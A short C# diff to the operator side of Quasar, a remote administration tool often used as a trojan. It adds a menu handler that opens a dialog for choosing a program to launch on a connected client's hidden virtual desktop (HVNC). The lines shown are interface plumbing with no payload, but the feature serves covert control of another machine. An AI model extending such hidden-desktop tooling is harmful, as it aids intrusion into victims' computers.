@@ -14,6 +14,7 @@ using System.Windows.Forms;
 using System.Diagnostics;
 using System.IO;
 using Quasar.Common.Messages.Monitoring.HVNC;
+using Quasar.Server.Forms.HVNC;
 
 namespace Quasar.Server.Forms
 {
@@ -442,6 +443,12 @@ namespace Quasar.Server.Forms
             {
                 Application = "Powershell"
             });
+        }
+
+        private void startCustomPathToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            FrmHVNCFileSelection fileSelectionForm = new FrmHVNCFileSelection(_connectClient);
+            fileSelectionForm.ShowDialog();
         }
 
         #endregion
